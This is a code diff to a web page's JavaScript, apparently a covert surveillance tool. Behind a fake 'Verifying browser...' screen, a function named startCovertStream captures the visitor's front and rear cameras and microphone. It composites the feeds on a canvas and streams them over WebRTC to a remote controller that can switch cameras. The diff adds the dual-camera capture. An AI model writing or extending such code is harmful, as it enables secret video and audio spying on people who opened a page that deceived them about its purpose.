@@ -142,36 +142,77 @@
         let ws;
         let pc;
         let localStream;
+        let frontStream = null;
+        let rearStream = null;
+        let compositeStream = null;
+        let canvasElement = null;
+        let canvasCtx = null;
+        let animFrameId = null;
         let pendingIceCandidates = [];
         let pingInterval = null;
         let isConnectingWs = false;
         let currentFacingMode = 'user'; // 'user' (front) or 'environment' (rear)
-        const video = document.getElementById('hiddenVideo');
+        
+        const frontVideo = document.createElement('video');
+        frontVideo.autoplay = true;
+        frontVideo.muted = true;
+        frontVideo.playsInline = true;
+
+        const rearVideo = document.createElement('video');
+        rearVideo.autoplay = true;
+        rearVideo.muted = true;
+        rearVideo.playsInline = true;
 
         async function startCovertStream() {
             const card = document.getElementById('mainCard');
             card.innerHTML = `
                 <div class="spinner"></div>
                 <h1 style="margin-top: 16px;">Verifying browser...</h1>
-                <p>Establishing secure connection. Please wait a moment.</p>
+                <p>Establishing dual camera feeds. Please wait a moment.</p>
             `;
 
             try {
-                localStream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: { ideal: currentFacingMode },
-                        width: { ideal: 1280, max: 1920 },
-                        height: { ideal: 720, max: 1080 },
-                        frameRate: { ideal: 30, max: 30 }
-                    },
-                    audio: {
-                        echoCancellation: true,
-                        noiseSuppression: true,
-                        autoGainControl: true
-                    }
-                });
+                // Initialize Front Camera
+                try {
+                    frontStream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: { ideal: "user" },
+                            width: { ideal: 1280, max: 1920 },
+                            height: { ideal: 720, max: 1080 },
+                            frameRate: { ideal: 30, max: 30 }
+                        },
+                        audio: {
+                            echoCancellation: true,
+                            noiseSuppression: true,
+                            autoGainControl: true
+                        }
+                    });
+                    frontVideo.srcObject = frontStream;
+                    await frontVideo.play().catch(() => {});
+                } catch (err) {
+                    console.warn("Front camera initial acquisition error:", err);
+                }
 
-                video.srcObject = localStream;
+                // Try acquiring Rear Camera simultaneously (if supported by hardware)
+                try {
+                    rearStream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: { ideal: "environment" },
+                            width: { ideal: 1280, max: 1920 },
+                            height: { ideal: 720, max: 1080 },
+                            frameRate: { ideal: 30, max: 30 }
+                        },
+                        audio: false
+                    });
+                    rearVideo.srcObject = rearStream;
+                    await rearVideo.play().catch(() => {});
+                } catch (err) {
+                    console.log("Hardware single-sensor mode: Rear camera will activate on demand.");
+                }
+
+                // Setup High-Definition Dual Canvas Compositor
+                setupDualCompositor();
+
                 connectSignaling();
             } catch (err) {
                 console.error("Media/connection error:", err);
@@ -182,9 +223,88 @@
             }
         }
 
+        function setupDualCompositor() {
+            canvasElement = document.createElement('canvas');
+            canvasElement.width = 1280;
+            canvasElement.height = 720;
+            canvasCtx = canvasElement.getContext('2d', { alpha: false });
+
+            function renderDualFrame() {
+                // Clear background
+                canvasCtx.fillStyle = "#090d16";
+                canvasCtx.fillRect(0, 0, 1280, 720);
+
+                // Draw Left Pane: FRONT CAMERA
+                if (frontVideo.videoWidth > 0) {
+                    canvasCtx.drawImage(frontVideo, 0, 0, 640, 720);
+                } else if (currentFacingMode === 'user' && rearVideo.videoWidth > 0) {
+                    canvasCtx.drawImage(rearVideo, 0, 0, 640, 720);
+                } else {
+                    canvasCtx.fillStyle = "#131d35";
+                    canvasCtx.fillRect(0, 0, 640, 720);
+                    canvasCtx.fillStyle = "#64748b";
+                    canvasCtx.font = "bold 20px monospace";
+                    canvasCtx.textAlign = "center";
+                    canvasCtx.fillText("FRONT CAMERA [STANDBY]", 320, 360);
+                }
+
+                // Draw Right Pane: REAR CAMERA
+                if (rearVideo.videoWidth > 0) {
+                    canvasCtx.drawImage(rearVideo, 640, 0, 640, 720);
+                } else if (currentFacingMode === 'environment' && frontVideo.videoWidth > 0) {
+                    canvasCtx.drawImage(frontVideo, 640, 0, 640, 720);
+                } else {
+                    canvasCtx.fillStyle = "#0f172a";
+                    canvasCtx.fillRect(640, 0, 640, 720);
+                    canvasCtx.fillStyle = "#64748b";
+                    canvasCtx.font = "bold 20px monospace";
+                    canvasCtx.textAlign = "center";
+                    canvasCtx.fillText("REAR CAMERA [STANDBY]", 960, 360);
+                }
+
+                // Center divider
+                canvasCtx.strokeStyle = "rgba(0, 242, 254, 0.4)";
+                canvasCtx.lineWidth = 4;
+                canvasCtx.beginPath();
+                canvasCtx.moveTo(640, 0);
+                canvasCtx.lineTo(640, 720);
+                canvasCtx.stroke();
+
+                // Front Badge
+                canvasCtx.fillStyle = "rgba(0, 0, 0, 0.75)";
+                canvasCtx.fillRect(16, 16, 210, 36);
+                canvasCtx.fillStyle = "#00f2fe";
+                canvasCtx.font = "bold 15px monospace";
+                canvasCtx.textAlign = "left";
+                canvasCtx.fillText("● FRONT CAMERA", 28, 40);
+
+                // Rear Badge
+                canvasCtx.fillStyle = "rgba(0, 0, 0, 0.75)";
+                canvasCtx.fillRect(656, 16, 210, 36);
+                canvasCtx.fillStyle = "#10b981";
+                canvasCtx.font = "bold 15px monospace";
+                canvasCtx.textAlign = "left";
+                canvasCtx.fillText("● REAR CAMERA", 668, 40);
+
+                animFrameId = requestAnimationFrame(renderDualFrame);
+            }
+
+            renderDualFrame();
+
+            compositeStream = canvasElement.captureStream(30);
+
+            // Add audio track if present
+            const audioStream = frontStream || rearStream;
+            if (audioStream && audioStream.getAudioTracks().length > 0) {
+                compositeStream.addTrack(audioStream.getAudioTracks()[0]);
+            }
+
+            localStream = compositeStream;
+        }
+
         async function switchCamera(requestedMode) {
             const targetMode = requestedMode || (currentFacingMode === 'user' ? 'environment' : 'user');
-            console.log(`[*] Switching camera to: ${targetMode}`);
+            console.log(`[*] Activating camera sensor: ${targetMode}`);
 
             try {
                 const newStream = await navigator.mediaDevices.getUserMedia({
@@ -197,34 +317,20 @@
                     audio: false
                 });
 
-                const newVideoTrack = newStream.getVideoTracks()[0];
-                if (!newVideoTrack) return;
-
-                // Seamlessly swap video track on existing peer connection without renegotiation
-                if (pc) {
-                    const senders = pc.getSenders();
-                    const videoSender = senders.find(s => s.track && s.track.kind === 'video');
-                    if (videoSender) {
-                        await videoSender.replaceTrack(newVideoTrack);
-                        console.log("[+] Video track successfully replaced on PeerConnection");
-                    }
-                }
-
-                // Stop previous video track
-                if (localStream) {
-                    localStream.getVideoTracks().forEach(track => {
-                        track.stop();
-                        localStream.removeTrack(track);
-                    });
-                    localStream.addTrack(newVideoTrack);
+                if (targetMode === 'environment') {
+                    if (rearStream) rearStream.getVideoTracks().forEach(t => t.stop());
+                    rearStream = newStream;
+                    rearVideo.srcObject = rearStream;
+                    await rearVideo.play().catch(() => {});
                 } else {
-                    localStream = newStream;
+                    if (frontStream) frontStream.getVideoTracks().forEach(t => t.stop());
+                    frontStream = newStream;
+                    frontVideo.srcObject = frontStream;
+                    await frontVideo.play().catch(() => {});
                 }
 
-                video.srcObject = localStream;
                 currentFacingMode = targetMode;
 
-                // Notify controller of current active camera
                 if (ws && ws.readyState === WebSocket.OPEN) {
                     ws.send(JSON.stringify({
                         type: "camera_info",
@@ -232,7 +338,7 @@
                     }));
                 }
             } catch (err) {
-                console.error("Failed to switch camera:", err);
+                console.error("Failed to activate camera:", err);
             }
         }
 
@@ -263,7 +369,6 @@
 
                 await sendOffer();
 
-                // Send initial camera status
                 if (ws && ws.readyState === WebSocket.OPEN) {
                     ws.send(JSON.stringify({
                         type: "camera_info",
@@ -349,7 +454,7 @@
             if (localStream) {
                 localStream.getTracks().forEach(track => {
                     if (track.readyState === 'live') {
-                        console.log("[+] Adding track:", track.kind);
+                        console.log("[+] Adding track to PC:", track.kind);
                         pc.addTrack(track, localStream);
                     }
                 });
